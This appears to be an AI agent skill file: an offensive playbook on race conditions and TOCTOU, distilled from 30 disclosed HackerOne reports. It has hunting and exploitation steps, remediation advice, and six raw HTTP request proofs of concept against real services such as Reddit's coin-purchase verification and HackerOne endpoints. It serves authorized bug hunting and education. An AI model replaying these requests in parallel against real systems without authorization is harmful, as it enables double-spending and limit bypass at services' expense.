---
name: race-condition
description: "Race Conditions & TOCTOU offensive playbook from 30 disclosed HackerOne reports (2 critical, 2 high, 8 medium, 18 low). Use when hunting or reviewing race conditions & toctou. Triggers: race, condition, attacker, allowed, limit."
license: "For authorized security testing and education only."
---

# Race Conditions & TOCTOU

> Distilled from **30** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Concurrent requests observe/act between a check and a use (TOCTOU), allowing limit bypasses like double-spend, multi-redeem, or duplicate resource creation.

## Where to hunt

- Find single-use or limited actions (coupon redeem, withdraw, invite, vote, follow) and fire many in parallel.

## Exploitation playbook

- Send N simultaneous requests to redeem/spend once-only items multiple times before state settles.

## Bypass techniques

- Exploit the window before a counter/flag is committed; use last-byte-sync for tight timing.

## Impact & escalation

- Financial loss (double-spend), quota/entitlement bypass, data duplication.

## Remediation

- Atomic operations, DB constraints/locks, idempotency keys, transactional check-and-set.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#488985](https://hackerone.com/reports/488985)  -  Race condition in claiming program credentials
*low*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 778
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/█████
Cookie: __cfduid=███████; _cfuid=███████; _ga=████; _mkto_trk=id:████████

{"query":"mutation Claim_credential_mutation($input_0:ClaimCredentialInput!,$types_1:[ErrorTypeEnum]!,$first_2:Int!) {claimCredential(input:$input_0) {clientMutationId,...F4,...F5}} fragment F0 on Team {id,claimed_credential {credentials,account_details,id}} fragment F1 on Node {id} fragment F2 on ResourceInterface {...F0,...F1} fragment F3 on Team {id} fragment F4 on ClaimCredentialPayload {team {id,...F2,...F3}} fragment F5 on ClaimCredentialPayload {team {claimed_credential {id},id},was_successful,_errors4fkckF:errors(types:$types_1,first:$first_2) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"team_id":"█████=","clientMutationId":"1"},"types_1":"ARGUMENT","first_2":100}}
```

### 2. [#1132171](https://hackerone.com/reports/1132171)  -  Race condition allows to send multiple times feedback for the hacker
*low*

```http
POST /hacker_reviews HTTP/1.1
Host: hackerone.com
X-CSRF-Token: $token
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 112
Origin: https://hackerone.com
Cookie: $cookies

hacker_username=kijkijkoijkijkijkijkijki&report_id=1132085&positive=false&behavior=rude&private_feedback=Testing
```

### 3. [#994051](https://hackerone.com/reports/994051)  -  Race condition on my.stripo.email at /cabinet/stripeapi/v1/projects…
*medium*

```http
POST /cabinet/stripeapi/v1/projects/298427/emails/folders HTTP/1.1
Host: my.stripo.email
Content-Length: 23
Content-Type: application/json;charset=UTF-8
Origin: https://my.stripo.email
```

### 4. [#1913309](https://hackerone.com/reports/1913309)  -  Race condition leads to add more than 5 email at Data breaches moni…
*low*

```http
POST /api/v1/user/email HTTP/2
Host: stage.firefoxmonitor.nonprod.cloudops.mozgcp.net
Cookie: connect.sid=█████; _ga_CXG8K4KW4P=GS1.1.1679333065.1.1.1679336292.0.0.0; _ga=GA1.1.518394987.1679333065
Referer: https://stage.firefoxmonitor.nonprod.cloudops.mozgcp.net/user/settings
Content-Type: application/json
X-Csrf-Token: 0787d9f55701a244aa8f68401f2dc6aebb55a1b83ee2930743ba1324314b5c2cb87fafa7bac74afd8d4660feff2ce33d5b38fb949478c5b9f32430e863ced6b4
Content-Length: 33
Origin: https://stage.firefoxmonitor.nonprod.cloudops.mozgcp.net

{"email":"████████"}
```

### 5. [#801743](https://hackerone.com/reports/801743)  -  Race condition leads to Inflation of coins when bought via Google P…
*medium*

```http
POST /api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715 HTTP/1.1
Authorization: Bearer REDACTED
Content-Type: application/x-www-form-urlencoded
Content-Length: 327
Host: oauth.reddit.com

transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd
```

### 6. [#604534](https://hackerone.com/reports/604534)  -  Race Condition leads to undeletable group member
*low*

```http
POST /group/post_join HTTP/1.1
Host: ctf.hacker101.com
Referer: https://ctf.hacker101.com/group/join?invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Cookie: COOKIES

csrf=391aecf0c3125e90c437d04c18204ab6&invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a
```

More payloads: see [payloads.md](payloads.md) (11 curated).

## Recurring patterns in this dataset

Most frequent terms across the 30 reports (term (count)): `race` (40), `condition` (40), `attacker` (10), `allowed` (7), `limit` (7), `endpoint` (6), `group` (6), `existed` (6), `function` (5), `invites` (5), `email` (5), `dns` (5), `times` (4), `requests` (4), `bypassing` (4), `maximum` (4), `process` (4), `cve-2023-28320` (4)

## Worked example  -  [report #300305](https://hackerone.com/reports/300305)

*Ability to bypass partner email confirmation to take over any store given an employee email* (critical, $15,250)

> I told Pete I would take a look at Spotify, hi Pete. Summary It's possible to take over any store account through partners given an employee email address. This is possible because I found a way to confirm arbitrary emails. I don't know the Shopify ecosystem well enough to know the other ramifications of such a bug. On 270981 you wrote: The intention was that, when a partner already had a valid user account on the store, their collaborator account request could be accepted automatically, with the user account converted into a collaborator account. I tested that functionality and confirmed how it works. I realized that if you can somehow create a partner account with a business email that mat…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#300305](https://hackerone.com/reports/300305) | critical | $15,250 | shopify | Ability to bypass partner email confirmation to take over any store given an employee e… |
| [#1438052](https://hackerone.com/reports/1438052) | critical | $5,000 | cosmos | Race condition in faucet when using starport |
| [#1520931](https://hackerone.com/reports/1520931) | high | $4,000 | ibb | Time-of-check to time-of-use vulnerability in the std::fs::remove_dir_all() function of… |
| [#2110030](https://hackerone.com/reports/2110030) | high | $3,000 | toolsforhumanity | Race Condition Enables Bypassing Verification Check |
| [#2078571](https://hackerone.com/reports/2078571) | medium | $2,480 | ibb | [curl] CVE-2023-32001: fopen race condition |
| [#429026](https://hackerone.com/reports/429026) | medium |  -  | security | Race condition in performing retest allows duplicated payments |
| [#2261577](https://hackerone.com/reports/2261577) | medium |  -  | mozilla | MozillaVPN: Elevation of Privilege via a Race Condition Vulnerability |
| [#801743](https://hackerone.com/reports/801743) | medium |  -  | reddit | Race condition leads to Inflation of coins when bought via Google Play Store at endpoin… |

*See [reference.md](reference.md) for all 30 reports in this class.*
